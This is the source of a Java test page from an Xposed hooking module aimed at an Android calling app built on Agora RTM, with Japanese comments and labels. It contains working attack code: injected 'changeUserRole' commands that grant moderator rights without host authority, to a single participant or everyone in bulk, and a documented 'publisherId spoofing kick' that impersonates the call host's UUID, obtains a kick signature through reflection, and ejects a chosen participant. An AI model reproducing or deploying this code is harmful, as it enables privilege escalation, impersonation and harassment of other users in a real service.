/*
 * Copyright (c) 2025 KyomuTools
 * All rights reserved.
 * Unauthorized modification, redistribution, or commercial use is prohibited.
 */
package com.kyomu.tools.ui.pages;

import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.kyomu.tools.MappingManager;
import com.kyomu.tools.call.MuteTarget;
import com.kyomu.tools.core.HookManager;
import com.kyomu.tools.core.StateHolder;
import com.kyomu.tools.ui.UIHelper;

import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import de.robv.android.xposed.XposedHelpers;

/**
 * テストページ
 *
 * 動作確認済み機能:
 *   changeUserRole RTM直送 → モデレーター権限付与/剥奪
 *
 * 通話情報 + 参加者選択 + changeUserRole 送信のみに絞ったシンプル実装
 */
public class TestPage {

    private static WeakReference<TextView> resultViewRef      = new WeakReference<>(null);
    private static WeakReference<TextView> selectedLabelRef   = new WeakReference<>(null);
    private static WeakReference<TextView> roleToggleBtnRef   = new WeakReference<>(null);
    private static WeakReference<TextView> hostUuidLabelRef   = new WeakReference<>(null);

    private static volatile String selectedTargetUuid = "";
    private static volatile String selectedTargetName = "";
    private static volatile boolean useModeratorRole  = true;

    // ──────────────────────────────────────────
    // build()
    // ──────────────────────────────────────────
    public static LinearLayout build(Activity activity) {
        LinearLayout page = new LinearLayout(activity);
        page.setOrientation(LinearLayout.VERTICAL);
        page.setPadding(0, 4, 0, 0);

        buildCallInfoSection(page, activity);
        page.addView(UIHelper.makeDivider(activity));

        buildTargetSelector(page, activity);
        page.addView(UIHelper.makeDivider(activity));

        buildChangeUserRoleSection(page, activity);
        page.addView(UIHelper.makeDivider(activity));

        buildSpoofKickSection(page, activity);
        page.addView(UIHelper.makeDivider(activity));

        buildResultLog(page, activity);

        return page;
    }

    // ──────────────────────────────────────────
    // 通話情報
    // ──────────────────────────────────────────
    private static void buildCallInfoSection(LinearLayout parent, Activity activity) {
        addSection(parent, activity, "通話情報", Color.argb(180, 80, 180, 255));

        final TextView infoView = new TextView(activity);
        infoView.setTextSize(9);
        infoView.setTextColor(Color.argb(200, 180, 180, 180));
        infoView.setPadding(4, 2, 4, 4);
        updateCallInfoText(infoView);
        parent.addView(infoView);

        // ホストUUID表示ラベル
        TextView hostUuidLabel = new TextView(activity);
        hostUuidLabel.setTextSize(9);
        hostUuidLabel.setPadding(6, 4, 6, 4);
        hostUuidLabel.setBackgroundColor(Color.argb(60, 0, 20, 40));
        hostUuidLabelRef = new WeakReference<>(hostUuidLabel);
        refreshHostUuidLabel(hostUuidLabel);
        parent.addView(hostUuidLabel);

        LinearLayout row = makeHorizontalRow(activity);
        LinearLayout.LayoutParams lp = makeBtnLp();

        TextView refreshBtn = makeSmallBtn(activity, "情報更新", Color.argb(255, 50, 80, 130));
        refreshBtn.setOnClickListener(v -> {
            updateCallInfoText(infoView);
            // ホストUUIDをuuidMapから逆引き
            tryDetectHostUuid();
            refreshHostUuidLabel(hostUuidLabel);
        });

        TextView detectHostBtn = makeSmallBtn(activity, "ホストUUID取得", Color.argb(255, 40, 110, 60));
        detectHostBtn.setOnClickListener(v -> {
            tryDetectHostUuid();
            refreshHostUuidLabel(hostUuidLabel);
            String h = StateHolder.detectedHostUuid;
            appendResult("[HostUUID] " + (h.isEmpty() ? "❌ 取得失敗" : "✅ " + h));
        });

        row.addView(refreshBtn, lp);
        row.addView(detectHostBtn, lp);
        parent.addView(row);
    }

    /** uuidMap から tmpHostId に対応する callUserUuid を逆引きして detectedHostUuid に保存 */
    private static void tryDetectHostUuid() {
        new Thread(() -> {
            try {
                Object cvm = StateHolder.getCachedCallViewModel();
                if (cvm == null) { appendResult("[HostUUID] CVM未取得"); return; }
                Object myCall = XposedHelpers.getObjectField(cvm, "myCall");
                if (myCall == null) { appendResult("[HostUUID] myCall null"); return; }

                // ── 方法①: uuidMap (uuid→userId) を hostId で逆引き ──
                if (StateHolder.tmpHostId != 0) {
                    try {
                        Field jf = myCall.getClass().getDeclaredField(
                                MappingManager.fld("CallImpl.uuidMap"));
                        jf.setAccessible(true);
                        Object jObj = jf.get(myCall);
                        if (jObj instanceof java.util.Map) {
                            for (java.util.Map.Entry<?, ?> e :
                                    ((java.util.Map<?, ?>) jObj).entrySet()) {
                                long val;
                                Object v = e.getValue();
                                if (v instanceof Long) val = (Long) v;
                                else if (v instanceof Integer) val = ((Integer) v).longValue();
                                else { try { val = Long.parseLong(v.toString()); } catch (Throwable x) { continue; } }
                                if (val == StateHolder.tmpHostId) {
                                    StateHolder.detectedHostUuid = e.getKey().toString();
                                    HookManager.log("[HostUUID] uuidMap逆引き成功: " + StateHolder.detectedHostUuid);
                                    return;
                                }
                            }
                        }
                        appendResult("[HostUUID] uuidMapにhostId=" + StateHolder.tmpHostId + "なし");
                    } catch (Throwable t) {
                        appendResult("[HostUUID] uuidMap取得失敗: " + t.getMessage());
                    }
                } else {
                    appendResult("[HostUUID] tmpHostId=0 (通話に参加してください)");
                }

                // ── 方法②: userList から枠主を探す (appUserId == tmpHostId) ──
                try {
                    Field uf = myCall.getClass().getDeclaredField(
                            MappingManager.fld("CallImpl.userList"));
                    uf.setAccessible(true);
                    Object uObj = uf.get(myCall);
                    if (uObj instanceof java.util.Collection) {
                        for (Object user : (java.util.Collection<?>) uObj) {
                            String ts = user.toString();
                            String appId   = extractField(ts, "appUserid");
                            String callUid = extractField(ts, "callUserId");
                            if (appId == null || callUid == null) continue;
                            try {
                                if (Long.parseLong(appId) == StateHolder.tmpHostId) {
                                    StateHolder.detectedHostUuid = callUid;
                                    HookManager.log("[HostUUID] userList逆引き成功: " + callUid);
                                    return;
                                }
                            } catch (Throwable ignored) {}
                        }
                    }
                    appendResult("[HostUUID] userListにhostId=" + StateHolder.tmpHostId + "なし");
                } catch (Throwable t) {
                    appendResult("[HostUUID] userList取得失敗: " + t.getMessage());
                }

            } catch (Throwable t) {
                appendResult("[HostUUID] 例外: " + t.getMessage());
            }
        }).start();
    }

    private static void refreshHostUuidLabel(TextView view) {
        if (view == null) return;
        String h  = StateHolder.detectedHostUuid;
        String hid = String.valueOf(StateHolder.tmpHostId);
        view.setText("hostId  : " + (StateHolder.tmpHostId == 0 ? "未取得" : hid) + "\n"
                + "hostUUID: " + (h.isEmpty() ? "未取得（「ホストUUID取得」を押す）" : h));
        view.setTextColor(h.isEmpty()
                ? Color.argb(180, 180, 130, 80)
                : Color.argb(220, 100, 240, 130));
    }

    // ──────────────────────────────────────────
    // 参加者セレクター
    // ──────────────────────────────────────────
    private static void buildTargetSelector(LinearLayout parent, Activity activity) {
        addSection(parent, activity, "対象参加者の選択", Color.argb(200, 100, 220, 150));

        TextView selectedLabel = new TextView(activity);
        selectedLabel.setTextSize(10);
        selectedLabel.setGravity(Gravity.CENTER);
        selectedLabel.setPadding(4, 4, 4, 4);
        refreshSelectedLabel(selectedLabel);
        selectedLabelRef = new WeakReference<>(selectedLabel);
        parent.addView(selectedLabel);

        final LinearLayout listContainer = new LinearLayout(activity);
        listContainer.setOrientation(LinearLayout.VERTICAL);
        listContainer.setVisibility(View.GONE);
        parent.addView(listContainer);

        TextView expandBtn = makeBtn(activity, "▼ 参加者リストを展開",
                Color.argb(255, 40, 110, 70));
        expandBtn.setOnClickListener(v -> {
            if (listContainer.getVisibility() == View.VISIBLE) {
                listContainer.setVisibility(View.GONE);
                expandBtn.setText("▼ 参加者リストを展開");
            } else {
                rebuildList(listContainer, activity, selectedLabel);
                listContainer.setVisibility(View.VISIBLE);
                expandBtn.setText("▲ 閉じる");
            }
        });
        parent.addView(expandBtn);

        TextView selfBtn = makeBtn(activity, "自分自身を選択",
                Color.argb(255, 80, 60, 160));
        selfBtn.setOnClickListener(v -> {
            String uuid = StateHolder.myCallUserUuid;
            if (uuid == null || uuid.isEmpty()) {
                appendResult("[選択] ❌ myUUID未取得（ミュートページで更新）");
            } else {
                selectedTargetUuid = uuid;
                selectedTargetName = "自分 (" + StateHolder.myUserId + ")";
                refreshSelectedLabel(selectedLabel);
                appendResult("[選択] 自分: " + uuid);
            }
        });
        parent.addView(selfBtn);
    }

    private static void rebuildList(LinearLayout container, Activity activity,
                                     TextView selectedLabel) {
        container.removeAllViews();
        List<MuteTarget> targets;
        synchronized (StateHolder.muteTargets) {
            targets = new ArrayList<>(StateHolder.muteTargets);
        }
        if (targets.isEmpty()) {
            TextView empty = new TextView(activity);
            empty.setText("参加者なし（ミュートページで「更新」を押してください）");
            empty.setTextColor(Color.GRAY);
            empty.setTextSize(9);
            empty.setGravity(Gravity.CENTER);
            container.addView(empty);
            return;
        }
        for (MuteTarget mt : targets) {
            final String uuid = mt.callUserId != null ? mt.callUserId : "";
            final String name = mt.name != null ? mt.name : "(不明)";

            TextView btn = new TextView(activity);
            btn.setText(name + "\n" + (uuid.isEmpty() ? "UUID不明" : uuid));
            btn.setTextColor(Color.WHITE);
            btn.setTextSize(9);
            btn.setGravity(Gravity.CENTER);
            btn.setPadding(8, 8, 8, 8);

            GradientDrawable bg = new GradientDrawable();
            bg.setCornerRadius(UIHelper.dp(6, activity));
            boolean sel = uuid.equals(selectedTargetUuid);
            bg.setColor(sel ? Color.argb(255, 40, 140, 80) : Color.argb(180, 40, 60, 80));
            bg.setStroke(1, sel ? Color.argb(255, 80, 220, 120) : Color.argb(80, 100, 100, 100));
            btn.setBackground(bg);

            LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);
            lp.setMargins(0, 3, 0, 3);
            btn.setLayoutParams(lp);

            btn.setOnClickListener(v -> {
                if (uuid.isEmpty()) { appendResult("[選択] ❌ UUID不明"); return; }
                selectedTargetUuid = uuid;
                selectedTargetName = name;
                refreshSelectedLabel(selectedLabel);
                appendResult("[選択] ✅ " + name);
                rebuildList(container, activity, selectedLabel);
            });
            container.addView(btn);
        }
    }

    private static void refreshSelectedLabel(TextView label) {
        if (label == null) return;
        if (selectedTargetUuid.isEmpty()) {
            label.setText("未選択");
            label.setTextColor(Color.argb(180, 200, 100, 100));
        } else {
            label.setText("✅ " + selectedTargetName + "\n" + selectedTargetUuid);
            label.setTextColor(Color.argb(220, 100, 220, 150));
        }
    }

    // ──────────────────────────────────────────
    // changeUserRole RTM直送
    // ──────────────────────────────────────────
    private static void buildChangeUserRoleSection(LinearLayout parent, Activity activity) {
        addSection(parent, activity, "changeUserRole RTM直送", Color.argb(200, 255, 200, 50));

        TextView desc = new TextView(activity);
        desc.setText(
                "枠主権限不要・RTM送信のみで動作\n"
                + "moderator → モデレーター権限付与\n"
                + "participant → 権限剥奪\n"
                + "全員一括でモデレーター付与→枠主と同等権限");
        desc.setTextColor(Color.argb(180, 220, 220, 180));
        desc.setTextSize(9);
        desc.setPadding(0, 0, 0, 6);
        parent.addView(desc);

        // ロールトグル行
        LinearLayout roleRow = makeHorizontalRow(activity);
        roleRow.setGravity(Gravity.CENTER_VERTICAL);
        roleRow.setPadding(0, 4, 0, 8);

        TextView roleLabel = new TextView(activity);
        roleLabel.setText("送信ロール: ");
        roleLabel.setTextColor(Color.WHITE);
        roleLabel.setTextSize(11);
        roleRow.addView(roleLabel);

        TextView roleToggle = makeSmallBtn(activity,
                useModeratorRole ? "moderator" : "participant",
                useModeratorRole ? Color.argb(255, 255, 140, 20) : Color.argb(255, 20, 130, 255));
        roleToggle.setOnClickListener(v -> {
            useModeratorRole = !useModeratorRole;
            roleToggle.setText(useModeratorRole ? "moderator" : "participant");
            GradientDrawable d = (GradientDrawable) roleToggle.getBackground();
            d.setColor(useModeratorRole
                    ? Color.argb(255, 255, 140, 20)
                    : Color.argb(255, 20, 130, 255));
        });
        roleToggleBtnRef = new WeakReference<>(roleToggle);
        LinearLayout.LayoutParams rlp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        rlp.setMargins(8, 0, 0, 0);
        roleRow.addView(roleToggle, rlp);
        parent.addView(roleRow);

        // ボタン行
        LinearLayout btnRow = makeHorizontalRow(activity);
        LinearLayout.LayoutParams lp = makeBtnLp();

        TextView execBtn = UIHelper.makeMuteActionBtn(activity,
                "選択対象に送信", Color.argb(255, 50, 130, 180));
        execBtn.setOnClickListener(v -> {
            if (selectedTargetUuid.isEmpty()) {
                appendResult("[changeUserRole] ❌ 対象を選択してください");
                return;
            }
            executeChangeUserRole(activity, selectedTargetUuid, selectedTargetName);
        });

        TextView allBtn = UIHelper.makeMuteActionBtn(activity,
                "全員に送信", Color.argb(255, 30, 100, 140));
        allBtn.setOnClickListener(v -> executeChangeUserRoleAll(activity));

        TextView selfBtn = UIHelper.makeMuteActionBtn(activity,
                "自己送信", Color.argb(255, 90, 40, 160));
        selfBtn.setOnClickListener(v -> executeChangeUserRoleSelf(activity));

        btnRow.addView(execBtn, lp);
        btnRow.addView(allBtn, lp);
        btnRow.addView(selfBtn, lp);
        parent.addView(btnRow);
    }

    private static void executeChangeUserRole(Activity activity, String uuid, String name) {
        String role = useModeratorRole ? "moderator" : "participant";
        String cmd  = "changeUserRole " + uuid + " " + role;
        appendResult("[changeUserRole] " + name + " → " + role);
        new Thread(() -> {
            boolean sent = sendRtmCommand(activity, cmd);
            appendResult("[changeUserRole] " + (sent ? "✅ 送信成功" : "❌ 送信失敗"));
        }).start();
    }

    private static void executeChangeUserRoleAll(Activity activity) {
        String role = useModeratorRole ? "moderator" : "participant";
        appendResult("[changeUserRole/全員] " + role + " 一括送信");
        new Thread(() -> {
            List<MuteTarget> targets;
            synchronized (StateHolder.muteTargets) {
                targets = new ArrayList<>(StateHolder.muteTargets);
            }
            if (targets.isEmpty()) {
                appendResult("[changeUserRole/全員] ❌ 参加者リストが空");
                return;
            }
            int ok = 0, ng = 0;
            for (MuteTarget mt : targets) {
                if (mt.callUserId == null || mt.callUserId.isEmpty()) { ng++; continue; }
                boolean sent = sendRtmCommand(activity,
                        "changeUserRole " + mt.callUserId + " " + role);
                if (sent) ok++; else ng++;
                try { Thread.sleep(120); } catch (InterruptedException ignored) {}
            }
            appendResult("[changeUserRole/全員] 完了: 成功=" + ok + " 失敗=" + ng);
        }).start();
    }

    private static void executeChangeUserRoleSelf(Activity activity) {
        new Thread(() -> {
            String uuid = StateHolder.myCallUserUuid;
            if (uuid == null || uuid.isEmpty()) {
                appendResult("[changeUserRole/自己] ❌ myUUID未取得");
                return;
            }
            String role = useModeratorRole ? "moderator" : "participant";
            boolean sent = sendRtmCommand(activity, "changeUserRole " + uuid + " " + role);
            appendResult("[changeUserRole/自己] " + (sent ? "✅ 送信成功" : "❌ 送信失敗"));
        }).start();
    }

    // ──────────────────────────────────────────
    // publisherId スプーフィング kick
    // ──────────────────────────────────────────

    /**
     * 攻撃手順:
     *  1. ホストUUIDを取得（uuidMap逆引き）
     *  2. spoofPublisherId=true + spoofPublisherUuid=hostUuid をセット
     *  3. 通話を一度退出→再参加 → joinChannelWithUserAccount の userAccount が
     *     ホストUUIDに差し替えられ、RTMチャンネルにホストとして参加する
     *  4. kick <targetUuid> <ts> <sig> を送信
     *     → 受信側: event.getPublisherId() == hostUuid → チェック通過 → キック成立
     *
     * ※ 署名(ts/sig)は CallApi.requestKickSignature で取得する
     *   （サーバー側に role チェックがあれば失敗する可能性あり）
     */
    private static void buildSpoofKickSection(LinearLayout parent, Activity activity) {
        addSection(parent, activity, "★ publisherId偽装キック", Color.argb(220, 255, 80, 80));

        TextView desc = new TextView(activity);
        desc.setText(
                "RTMのpublisherIdをホストUUIDに偽装してkickを送信\n"
                + "手順: ①ホストUUID取得 → ②偽装フラグON → ③退出/再参加 → ④kick送信\n"
                + "受信側: event.getPublisherId()==hostUuid → チェック通過");
        desc.setTextColor(Color.argb(180, 255, 200, 200));
        desc.setTextSize(9);
        desc.setPadding(0, 0, 0, 6);
        parent.addView(desc);

        // 状態表示
        final TextView statusLabel = new TextView(activity);
        statusLabel.setTextSize(9);
        statusLabel.setPadding(4, 4, 4, 4);
        statusLabel.setBackgroundColor(Color.argb(60, 40, 0, 0));
        refreshSpoofStatus(statusLabel);
        parent.addView(statusLabel);

        // 行1: 偽装フラグON / OFF
        LinearLayout row1 = makeHorizontalRow(activity);
        LinearLayout.LayoutParams lp = makeBtnLp();

        TextView setSpoofBtn = makeSmallBtn(activity, "①偽装フラグON", Color.argb(255, 180, 40, 40));
        setSpoofBtn.setOnClickListener(v -> {
            String hostUuid = StateHolder.detectedHostUuid;
            if (hostUuid.isEmpty()) {
                appendResult("[Spoof] ❌ ホストUUID未取得（通話情報セクションで取得してください）");
                return;
            }
            StateHolder.spoofPublisherUuid = hostUuid;
            StateHolder.spoofPublisherId   = true;
            refreshSpoofStatus(statusLabel);
            appendResult("[Spoof] ✅ 偽装フラグON: " + hostUuid);
            appendResult("[Spoof] 次に通話を退出→再参加してください");
        });

        TextView clearSpoofBtn = makeSmallBtn(activity, "フラグOFF", Color.argb(255, 80, 80, 80));
        clearSpoofBtn.setOnClickListener(v -> {
            StateHolder.spoofPublisherId   = false;
            StateHolder.spoofPublisherUuid = "";
            refreshSpoofStatus(statusLabel);
            appendResult("[Spoof] フラグクリア");
        });

        row1.addView(setSpoofBtn, lp);
        row1.addView(clearSpoofBtn, lp);
        parent.addView(row1);

        // 行2: kick送信（偽装済み状態で）
        LinearLayout row2 = makeHorizontalRow(activity);

        TextView spoofKickBtn = UIHelper.makeMuteActionBtn(activity,
                "④偽装kick送信（選択対象）", Color.argb(255, 180, 40, 40));
        spoofKickBtn.setOnClickListener(v -> {
            if (selectedTargetUuid.isEmpty()) {
                appendResult("[Spoof] ❌ 対象を選択してください");
                return;
            }
            executeSpoofKick(activity, selectedTargetUuid, selectedTargetName);
        });

        LinearLayout.LayoutParams fullLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        fullLp.setMargins(4, 0, 4, 0);
        row2.addView(spoofKickBtn, fullLp);
        parent.addView(row2);
    }

    private static void refreshSpoofStatus(TextView view) {
        if (view == null) return;
        boolean on   = StateHolder.spoofPublisherId;
        String  uuid = StateHolder.spoofPublisherUuid;
        view.setText("偽装フラグ: " + (on ? "✅ ON" : "❌ OFF")
                + "\n偽装UUID : " + (uuid.isEmpty() ? "未設定" : uuid));
        view.setTextColor(on
                ? Color.argb(220, 255, 120, 120)
                : Color.argb(160, 180, 180, 180));
    }

    private static void executeSpoofKick(Activity activity, String targetUuid, String name) {
        appendResult("[SpoofKick] 対象: " + name);
        new Thread(() -> {
            try {
                Object cvm = StateHolder.getCachedCallViewModel();
                if (cvm == null) { appendResult("[SpoofKick] ❌ CVM未取得"); return; }
                Object myCall = XposedHelpers.getObjectField(cvm, "myCall");
                if (myCall == null) { appendResult("[SpoofKick] ❌ myCall null"); return; }

                // conferenceCall から callId を取得
                Object conf = XposedHelpers.getObjectField(myCall,
                        MappingManager.fld("CallImpl.conferenceCall"));
                if (conf == null) { appendResult("[SpoofKick] ❌ conf null"); return; }

                String confStr = conf.toString();
                long confId = 0;
                String idStr = extractField(confStr, "id");
                if (idStr != null) {
                    try { confId = Long.parseLong(idStr); } catch (NumberFormatException ignored) {}
                }
                if (confId == 0) { appendResult("[SpoofKick] ❌ callId取得失敗"); return; }

                // CallApi.requestKickSignature で署名を取得
                Object apiProxy = XposedHelpers.getObjectField(myCall,
                        MappingManager.fld("CallImpl.apiProxy"));
                if (apiProxy == null) { appendResult("[SpoofKick] ❌ apiProxy null"); return; }

                java.lang.reflect.InvocationHandler handler =
                        java.lang.reflect.Proxy.getInvocationHandler(apiProxy);
                Class<?> apiInterface = Class.forName(
                        MappingManager.cls("CallApi"),
                        false, apiProxy.getClass().getClassLoader());

                java.lang.reflect.Method kickMethod = null;
                String kickMethodName = MappingManager.mtd("CallApi.requestKickSignature");
                for (java.lang.reflect.Method m : apiInterface.getDeclaredMethods()) {
                    if (m.getName().equals(kickMethodName) && m.getParameterCount() == 3) {
                        kickMethod = m;
                        break;
                    }
                }
                if (kickMethod == null) { appendResult("[SpoofKick] ❌ kickMethod未発見"); return; }

                final long finalConfId    = confId;
                final java.lang.reflect.Method finalKickMethod = kickMethod;
                final String finalTargetUuid = targetUuid;

                Object result = handler.invoke(apiProxy, finalKickMethod,
                        new Object[]{finalConfId, finalTargetUuid, false});
                if (result == null) { appendResult("[SpoofKick] ❌ API呼び出し失敗"); return; }

                appendResult("[SpoofKick] 署名取得中...");

                // subscribe してシグネチャを受け取り kick 送信
                // autoSubscribe 相当のロジックをインライン化
                java.lang.reflect.InvocationHandler observerHandler = (proxy, method, args) -> {
                    String mName = method.getName();
                    if ("onSuccess".equals(mName) && args != null
                            && args.length > 0 && args[0] != null) {
                        try {
                            Object response = args[0];
                            // extractSignaturePayload 相当
                            Object sigPayload = null;
                            for (Field f : response.getClass().getDeclaredFields()) {
                                f.setAccessible(true);
                                Object val = f.get(response);
                                if (val != null && val.getClass().getName().contains("Signature")) {
                                    sigPayload = val; break;
                                }
                            }
                            if (sigPayload == null) {
                                for (Field f : response.getClass().getDeclaredFields()) {
                                    f.setAccessible(true);
                                    String fn = f.getName();
                                    if ("signature".equals(fn) || "timestamp".equals(fn)) {
                                        sigPayload = response; break;
                                    }
                                }
                            }
                            if (sigPayload == null) {
                                appendResult("[SpoofKick] ❌ sigPayload null");
                                return null;
                            }
                            String signature = null, timestamp = null;
                            for (Field f : sigPayload.getClass().getDeclaredFields()) {
                                f.setAccessible(true);
                                String fn = f.getName();
                                Object fv = f.get(sigPayload);
                                if ("signature".equals(fn) && fv != null) signature = fv.toString();
                                if ("timestamp".equals(fn) && fv != null) timestamp = fv.toString();
                            }
                            if (signature == null || timestamp == null) {
                                appendResult("[SpoofKick] ❌ sig/ts null");
                                return null;
                            }
                            String cmd = "kick " + finalTargetUuid
                                    + " " + timestamp + " " + signature;
                            appendResult("[SpoofKick] 送信: "
                                    + cmd.substring(0, Math.min(60, cmd.length())));
                            boolean sent = sendRtmCommand(activity, cmd);
                            appendResult("[SpoofKick] " + (sent ? "✅ 送信成功" : "❌ 送信失敗"));
                        } catch (Throwable t) {
                            appendResult("[SpoofKick] ❌ シグネチャ処理失敗: " + t.getMessage());
                        }
                    } else if ("onError".equals(mName)) {
                        appendResult("[SpoofKick] ❌ onError: "
                                + (args != null && args.length > 0 ? args[0] : "null"));
                    }
                    return null;
                };
                // subscribe を試みる
                boolean subscribed = false;
                for (java.lang.reflect.Method sm : result.getClass().getMethods()) {
                    if (sm.getParameterCount() != 1) continue;
                    Class<?> pType = sm.getParameterTypes()[0];
                    if (!pType.isInterface() || pType.getName().startsWith("java.")) continue;
                    try {
                        Object proxy = java.lang.reflect.Proxy.newProxyInstance(
                                pType.getClassLoader(), new Class<?>[]{pType}, observerHandler);
                        sm.setAccessible(true);
                        sm.invoke(result, proxy);
                        subscribed = true;
                        break;
                    } catch (Throwable ignored) {}
                }
                if (!subscribed) {
                    appendResult("[SpoofKick] ❌ subscribe失敗");
                }

            } catch (Throwable t) {
                appendResult("[SpoofKick] ❌ 例外: " + t.getMessage());
            }
        }).start();
    }

    // ──────────────────────────────────────────
    // テスト結果ログ
    // ──────────────────────────────────────────
    private static void buildResultLog(LinearLayout parent, Activity activity) {
        addSection(parent, activity, "ログ", Color.argb(180, 150, 150, 150));

        TextView resultView = new TextView(activity);
        resultView.setTextColor(Color.argb(220, 200, 230, 200));
        resultView.setTextSize(9);
        resultView.setPadding(4, 4, 4, 4);
        resultView.setBackgroundColor(Color.argb(80, 0, 0, 0));
        resultView.setText("（ここに結果が表示されます）");
        resultViewRef = new WeakReference<>(resultView);
        parent.addView(resultView);

        TextView clearBtn = new TextView(activity);
        clearBtn.setText("[ クリア ]");
        clearBtn.setTextColor(Color.GRAY);
        clearBtn.setTextSize(10);
        clearBtn.setGravity(Gravity.CENTER);
        clearBtn.setPadding(0, 8, 0, 0);
        clearBtn.setOnClickListener(v -> {
            StateHolder.testResultLog.clear();
            TextView rv = resultViewRef.get();
            if (rv != null) rv.setText("（クリアされました）");
        });
        parent.addView(clearBtn);
    }

    // ──────────────────────────────────────────
    // 共通ユーティリティ
    // ──────────────────────────────────────────
    private static boolean sendRtmCommand(Activity activity, String cmd) {
        try {
            Object agoraA = StateHolder.getAgoraA();
            if (agoraA == null) {
                if (!ensureAgoraCached()) return false;
                agoraA = StateHolder.getAgoraA();
                if (agoraA == null) return false;
            }
            XposedHelpers.callMethod(agoraA,
                    MappingManager.mtd("AgoraWrapper.sendCommand"), cmd);
            HookManager.log("[Test] sendCommand: " + cmd.substring(0, Math.min(80, cmd.length())));
            return true;
        } catch (Throwable t) {
            HookManager.log("[Test] sendCommand失敗: " + t.getMessage());
            return false;
        }
    }

    private static boolean ensureAgoraCached() {
        if (StateHolder.getAgoraA() != null) return true;
        try {
            Object cvm = StateHolder.getCachedCallViewModel();
            if (cvm == null) return false;
            Object myCall = XposedHelpers.getObjectField(cvm, "myCall");
            if (myCall == null) return false;
            Object agoraClient = XposedHelpers.getObjectField(myCall,
                    MappingManager.fld("CallImpl.agoraClient"));
            if (agoraClient == null) return false;
            Object agoraA = XposedHelpers.getObjectField(agoraClient,
                    MappingManager.fld("AgoraClient.engine"));
            if (agoraA == null) return false;
            StateHolder.setAgoraA(agoraA);
            return true;
        } catch (Throwable t) {
            HookManager.log("[Test] ensureAgoraCached失敗: " + t.getMessage());
            return false;
        }
    }

    private static String extractField(String s, String key) {
        String search = key + "=";
        int idx = s.indexOf(search);
        if (idx < 0) return null;
        int start = idx + search.length();
        int end = s.indexOf(",", start);
        if (end < 0) end = s.indexOf(")", start);
        if (end < 0) end = s.length();
        return s.substring(start, end).trim();
    }

    private static void updateCallInfoText(TextView view) {
        if (view == null) return;
        StringBuilder sb = new StringBuilder();
        sb.append("callId  : ").append(StateHolder.currentCallId).append("\n");
        sb.append("channel : ").append(StateHolder.agoraChannel).append("\n");
        sb.append("myUserId: ").append(StateHolder.myUserId).append("\n");
        sb.append("myUUID  : ").append(StateHolder.myCallUserUuid).append("\n");
        sb.append("hostId  : ").append(StateHolder.tmpHostId).append("\n");
        sb.append("inCall  : ").append(StateHolder.inCall).append("\n");
        sb.append("agora.a : ").append(StateHolder.getAgoraA() != null ? "✅" : "❌").append("\n");
        sb.append("CVM     : ").append(StateHolder.getCachedCallViewModel() != null ? "✅" : "❌");
        view.setText(sb.toString());
    }

    private static void appendResult(String msg) {
        HookManager.log("[TestPage] " + msg);
        synchronized (StateHolder.testResultLog) {
            StateHolder.testResultLog.add(msg);
            if (StateHolder.testResultLog.size() > StateHolder.TEST_LOG_MAX)
                StateHolder.testResultLog.remove(0);
        }
        Activity act = StateHolder.getLastActivity();
        if (act != null) {
            act.runOnUiThread(() -> {
                TextView rv = resultViewRef.get();
                if (rv == null) return;
                StringBuilder sb = new StringBuilder();
                synchronized (StateHolder.testResultLog) {
                    for (int i = StateHolder.testResultLog.size() - 1; i >= 0; i--)
                        sb.append(StateHolder.testResultLog.get(i)).append("\n");
                }
                rv.setText(sb.toString().trim());
            });
        }
    }

    private static void addSection(LinearLayout parent, Activity activity,
                                    String text, int color) {
        TextView tv = new TextView(activity);
        tv.setText(text);
        tv.setTextColor(color);
        tv.setTextSize(11);
        tv.setGravity(Gravity.CENTER);
        tv.setPadding(0, 8, 0, 4);
        parent.addView(tv);
    }

    private static TextView makeBtn(Activity activity, String label, int bgColor) {
        TextView btn = new TextView(activity);
        btn.setText(label);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(11);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(16, 10, 16, 10);
        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(UIHelper.dp(8, activity));
        bg.setColor(bgColor);
        btn.setBackground(bg);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 4, 0, 4);
        btn.setLayoutParams(lp);
        return btn;
    }

    private static TextView makeSmallBtn(Activity activity, String label, int bgColor) {
        TextView btn = new TextView(activity);
        btn.setText(label);
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(11);
        btn.setGravity(Gravity.CENTER);
        btn.setPadding(14, 8, 14, 8);
        GradientDrawable bg = new GradientDrawable();
        bg.setCornerRadius(UIHelper.dp(6, activity));
        bg.setColor(bgColor);
        btn.setBackground(bg);
        return btn;
    }

    private static LinearLayout makeHorizontalRow(Activity activity) {
        LinearLayout row = new LinearLayout(activity);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER);
        row.setPadding(0, 0, 0, 8);
        return row;
    }

    private static LinearLayout.LayoutParams makeBtnLp() {
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(4, 0, 4, 0);
        return lp;
    }

    public static void resetRefs() {
        resultViewRef    = new WeakReference<>(null);
        selectedLabelRef = new WeakReference<>(null);
        roleToggleBtnRef = new WeakReference<>(null);
        hostUuidLabelRef = new WeakReference<>(null);
    }
}
